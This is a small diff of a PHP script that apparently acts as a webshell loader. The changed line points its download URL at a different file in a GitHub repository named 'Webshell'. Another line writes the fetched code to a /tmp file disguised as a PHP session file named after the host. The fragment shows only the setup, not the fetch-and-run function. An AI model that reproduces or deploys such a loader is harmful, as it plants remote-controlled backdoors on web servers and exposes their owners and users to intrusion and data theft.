@@ -1,5 +1,5 @@
 <?php
-$URL = 'https://raw.githubusercontent.com/Kaizen1337/Webshell/master/Team_CC.php';
+$URL = 'https://raw.githubusercontent.com/Kaizen1337/Webshell/master/xeon.php';
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
  
 function M() {
